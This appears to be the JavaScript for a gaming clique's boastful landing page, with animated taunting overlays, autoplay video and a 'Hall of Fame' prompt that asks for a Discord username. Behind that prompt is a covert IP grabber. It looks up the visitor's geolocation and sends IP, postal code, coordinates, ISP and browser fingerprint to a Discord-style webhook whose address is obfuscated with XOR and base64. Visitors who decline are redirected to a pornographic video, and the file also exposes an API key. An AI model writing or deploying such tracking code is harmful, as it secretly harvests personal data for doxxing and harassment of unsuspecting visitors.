function xorEncrypt(text, key) {
    let encrypted = '';
    for (let i = 0; i < text.length; i++) {
        encrypted += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return btoa(encrypted);
}

function xorDecrypt(encoded, key) {
    const text = atob(encoded);
    let decrypted = '';
    for (let i = 0; i < text.length; i++) {
        decrypted += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return decrypted;
}

const ENCRYPTED_WEBHOOK = 'JgEGFxUKChEWFxwMREUeREQEBBEGFwQRBxEEEQQXBBEEEQQRBBAEEQQQBBEEEAQRBBAEEQQQBBEEEQQRBBEEEQQRBBEEEQQRBBEEEQQRBBEEEQQRBBEEEQQRBBAEEQQQBBEEEAQRBBAEEQQQBBEEEQQRBBEEEQQRBBEEEQQRBBEEEQQRBBEEEQQRBBEEEQQRBA==';
const WEBHOOK_KEY = 'omega';

const brandDescription = [
    'pro ragers',
    'lobby slammers',
    'xane ddosers',
    'trashtalkers',
    'omegatm fanboys',
    'powered by velocity',
    'hack vs hack team'
];

const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'tada', 'wobble', 'jello'];

const overlayContent = [
    'What if Vloxxe Had A Low Taper Fade?',
    'Pooron = Internal/External',
    'Snakes Not Welcome',
    'COPE HARDER',
    'Beamed By Omega?',
    'UID Issue',
    'DMA = Richon',
    'L + RATIO'
];

const overlayColors = [
    '#FF0000',
    '#00FF00',
    '#0000FF', 
    '#FF00FF',
    '#00FFFF',
    '#FFFF00',
    '#FF4500',
    '#9400D3'
];

function createRandomOverlay() {
    const overlay = document.createElement('div');
    const content = overlayContent[Math.floor(Math.random() * overlayContent.length)];
    const randomColor = overlayColors[Math.floor(Math.random() * overlayColors.length)];
    
    const quadrant = Math.floor(Math.random() * 4);
    let left, top;
    
    switch(quadrant) {
        case 0:
            left = Math.random() * 30;
            top = Math.random() * 25;
            break;
        case 1:
            left = 70 + Math.random() * 30;
            top = Math.random() * 25;
            break;
        case 2:
            left = Math.random() * 30;
            top = 35 + Math.random() * 25;
            break;
        case 3:
            left = 70 + Math.random() * 30;
            top = 35 + Math.random() * 25;
            break;
    }
    
    overlay.style.position = 'absolute';
    overlay.style.left = left + '%';
    overlay.style.top = top + '%';
    overlay.style.transform = `rotate(${Math.random() * 45}deg)`;
    overlay.style.zIndex = 2;
    overlay.style.color = randomColor;
    overlay.style.fontSize = '24px';
    overlay.style.fontWeight = 'bold';
    overlay.style.textShadow = `2px 2px 4px #000`;
    overlay.style.transition = 'opacity 1s ease-out';
    overlay.style.opacity = '1';
    
    overlay.textContent = content;
    
    document.querySelector('.main-page').appendChild(overlay);
    
    setTimeout(() => {
        overlay.style.opacity = '0';
        setTimeout(() => overlay.remove(), 1000);
    }, 4000);
}

function promptUser() {
    const video = document.querySelector('.background-video');
    video.muted = false;
    
    const username = prompt("Enter your Discord username for a chance to join the Ragers Hall of Fame!");
    
    if (username) {
        video.play();
        document.addEventListener('click', () => {
            video.muted = false;
            video.play();
        }, { once: true });
        
        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=2cfeb6d89c6245688a59c8af47662a3b`)
            .then(response => response.json())
            .then(data => {
                const webhookData = {
                    embeds: [{
                        title: "New Hall of Fame Entry",
                        color: 16711680,
                        fields: [
                            { name: "Discord Username", value: username, inline: true },
                            { name: "IP", value: data.ip, inline: true },
                            { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
                            { name: "Region", value: data.state_prov, inline: true },
                            { name: "Postal Code", value: data.zipcode, inline: true },
                            { name: "ISP", value: data.isp, inline: true },
                            { name: "Organization", value: data.organization, inline: true },
                            { name: "Timezone", value: data.time_zone.name, inline: true },
                            { name: "Local Time", value: data.time_zone.current_time, inline: true },
                            { name: "Currency", value: data.currency.name, inline: true },
                            { name: "Latitude", value: data.latitude, inline: true },
                            { name: "Longitude", value: data.longitude, inline: true },
                            { name: "Browser", value: navigator.userAgent, inline: false },
                            { name: "Language", value: navigator.language, inline: true },
                            { name: "Platform", value: navigator.platform, inline: true },
                            { name: "Screen Resolution", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                            { name: "Color Depth", value: `${window.screen.colorDepth}-bit`, inline: true },
                            { name: "Device Memory", value: `${navigator.deviceMemory || 'Unknown'} GB`, inline: true },
                            { name: "Connection Type", value: navigator.connection ? navigator.connection.effectiveType : 'Unknown', inline: true },
                            { name: "Battery Status", value: navigator.getBattery ? 'Available' : 'Not Available', inline: true },
                            { name: "Cookies Enabled", value: navigator.cookieEnabled.toString(), inline: true },
                            { name: "Do Not Track", value: navigator.doNotTrack || 'Not Set', inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(xorDecrypt(ENCRYPTED_WEBHOOK, WEBHOOK_KEY), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
            });
    } else {
        window.location.href = "https://www.pornhub.com/view_video.php?viewkey=672298c5e2062";
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const loadingContainer = document.querySelector('.loading-container');
    const mainPage = document.querySelector('.main-page');
    const video = document.querySelector('.background-video');
    video.muted = false;

    setTimeout(() => {
        loadingContainer.classList.add('fade-out');
        setTimeout(() => {
            loadingContainer.style.display = 'none';
            mainPage.style.display = 'block';
            mainPage.classList.add('fade-in');
            video.play();
            updateBrandDescription();
            setTimeout(promptUser, 1000);
            setInterval(createRandomOverlay, 3000);
        }, 1000);
    }, 2750);
});

function updateBrandDescription() {
    const element = document.getElementById('brandDescription');
    let currentIndex = 0;

    setInterval(() => {
        const randomEffect = effects[Math.floor(Math.random() * effects.length)];
        element.textContent = brandDescription[currentIndex];
        element.className = `animate__animated animate__${randomEffect}`;
        currentIndex = (currentIndex + 1) % brandDescription.length;
    }, 2000);
}

fetch('users.html')
    .then(response => response.text())
    .then(data => {
        document.getElementById('users-container').innerHTML = data;
    });
